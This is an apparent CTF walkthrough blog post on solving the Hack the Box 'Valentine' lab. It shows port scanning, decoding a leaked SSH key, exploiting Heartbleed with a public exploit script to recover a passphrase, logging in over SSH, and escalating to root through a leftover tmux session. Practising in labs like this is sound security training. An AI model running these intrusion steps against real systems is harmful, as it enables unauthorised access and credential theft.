<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box: Valentine Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-valentine-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-08-01T03:05:15+00:00">August 1, 2018</time><time class="updated" datetime="2025-07-05T16:16:27+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to solve the CTF challenge “<strong>Valentine</strong>” which is a vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have a very good collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Difficulty Level: Medium</strong></span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on victim’s machine.</span></p>
<h3><span style="color: #800000;">Steps involved</span></h3>
<ul>
<li><span style="color: #000000;">Port scanning and services detection</span></li>
<li><span style="color: #000000;">Web server directory enumeration</span></li>
<li><span style="color: #000000;">Discovery of hex encoded ssh key</span></li>
<li><span style="color: #000000;">Decoding key</span></li>
<li><span style="color: #000000;">Finding Passphrase</span></li>
<li><span style="color: #000000;">Capturing user flag</span></li>
<li><span style="color: #000000;">Capturing root flag</span></li>
</ul>
<p><span style="color: #000000;">This lab has a static IP and IP of <strong>10.10.10.79. </strong>So let’s start the CTF challenge with port scanning.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –A 10.10.10.79</pre>
<p><span style="color: #000000;">From its scanning result we found port 22 and 80 are open for ssh and http services.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CKE6Y-yIMcc/W2CTAx6yvbI/AAAAAAAAYzA/rMxVKhnUKdMcvl1Nv_VkLp5b5nlZsaengCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Then, let’s enumerate the web service running on port 80. The below image could be a hint, there is a heart and blood. <strong>Does it mean heartbleed</strong>?  Could be! Let’s enumerate further.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-yLkOS81_MyA/W2CTC2nVuTI/AAAAAAAAYzY/r8Qi3KDhdvQgvclUMpeJEhNUoZqu8rsewCLcBGAs/s1600/2.png"/></span></p>
<h5><span style="color: #000000;">Let’s see what we can find by directory brute forcing:</span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.79</pre>
<p><span style="color: #000000;">It put so many files but /dev looks more interesting so Lets browse http://10.10.10.73/dev.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Efdbwyb8ZmE/W2CTDKTLwNI/AAAAAAAAYzg/zbWRN6TDA0EotZjc6d_vISUBFtlMkldEACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Great we found some directories here. Let’s manually check these directories one by one. The directory “dev” seems very interesting, There are two files as shown in the below images.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5jbaXf27j6w/W2CTDNKcdSI/AAAAAAAAYzc/Zk7KGfc5WvQDqk6NMwHTqnx8CoOGp5xJQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Firstly I opened notes.txt file as shown in the below image, it seems there is some encoding and decoding is involved.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3ntRYxoasEY/W2CTD3jodbI/AAAAAAAAYzk/A1Ddiu-KXNY_QDjvaIzeA7lAHZylS1N5wCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Then we opened another file <strong>hype_key </strong>and notice found encoded hex text, let’s convert it into plain text and see if it makes any sense.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Fe0wp-MNQNU/W2CTETY2lwI/AAAAAAAAYzs/P_2L5GtCYO872kTmxJ8EIOcSLVMWZml_gCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">With help of burp we try to decode above hex into plain text as shown in the image. So it’s a RSA private key, but it has space after each character, which needs to be fixed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-drBWjGkHajw/W2CTEPzcUKI/AAAAAAAAYzo/mBypM9UIEJko5_5ZJ8rsdp27gWadzaAfwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">After removing space using sed command, we get our key as shown in the image below. Now all we need is a passphrase.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sed 's/ //g' key&gt; sshkey
cat sshkey</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jDUhcFSCKe4/W2CTEweNocI/AAAAAAAAYzw/cSBTkhgMHjgjKzgfUjA9byvyCYqhUokuQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Checking if the <strong>HTTPS</strong> web service is vulnerable to <strong>heartbleed </strong>with help of nmap script<strong>.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –p 443 --script ssl-heartbleed 10.10.10.79</pre>
<p><span style="color: #000000;">As expected the service is vulnerable to heartbleed, now let’s try to exploit it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EQrx5ZS4A48/W2CTAggImOI/AAAAAAAAYy4/sCAyjAQyYf00x4MEuAQkLnoiK0AXbIipQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Searching heartbleed exploit using searchsploit, and luckily found a python exploit <strong>32764.py </strong>in our local system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit heartbleed</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-wNcaKEroWxk/W2CTAgYnwpI/AAAAAAAAYy8/V2A96nWBlo4z1S31mprcqYtVsvv2mXjZgCLcBGAs/s1600/11.png"/></strong></span></p>
<p><span style="color: #000000;"><strong> </strong>So I copied the python exploit on the desktop and run against target’s IP for exploiting heartbleed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python 32764.py 10.10.10.79</pre>
<h5><span style="color: #000000;">Wow! It worked perfectly as aspect.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-pIsL6WsKjXk/W2CTBexyyyI/AAAAAAAAYzE/7TrQkqDY0ykq13cruA6ksn6gqAMweJhbgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">As shown in the image above, there is a string. Let’s decode the string with the help of following command, it may give the passphrase for ssh login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 –d</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-UX7fxxbaRik/W2CTBgIQawI/AAAAAAAAYzI/meFRdIbHYG4xBjQN6GN-WAmgUGiErbKPQCLcBGAs/s1600/13.png"/></strong></span></p>
<p><span style="color: #000000;">Then, let’s try to login SSH using the key and passphrase and after making successful login we found user.txt file from inside /home/hype/Desktop</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh –i key hype@10.10.10.79
cd /home
ls
cd hype
ls
cd Desktop
ls
cat user.txt</pre>
<p><span style="color: #000000;">So we logged in successfully and captured the user flag. Here 1<sup>st</sup> task is completed; let’s find out root.txt to finish the 2<sup>nd</sup> task.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vpsZmgBqdO0/W2CTByKisQI/AAAAAAAAYzM/Nq9Iz07Ktjgj3rcvt2Ey034Waktj_K88wCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">During further enumerating the <strong>history of commands</strong> on the system, we found some interesting commands</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat .bash_history
tmux –S /.devs/dev_sess</pre>
<p><span style="color: #000000;">Hmm!!! We got the root as shown in last image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-5os8TryLH9E/W2CTCYuRWfI/AAAAAAAAYzQ/iJr-Zs7k_g4NMAQNMEfVXYdzIKJZwTv8QCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Then, let’s grab the root.txt file quickly and finish this task. On running the below command we got our Root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;">We finished both tasks successfully!!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dC_UsKCftYk/W2CTClLXxxI/AAAAAAAAYzU/L-q5lJnNYZMOO_m30-lZTVGoxHmggXepgCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Vishva Vaghela is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on</span><strong><a href="https://www.linkedin.com/in/vishva-vaghela-979446191/"> Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
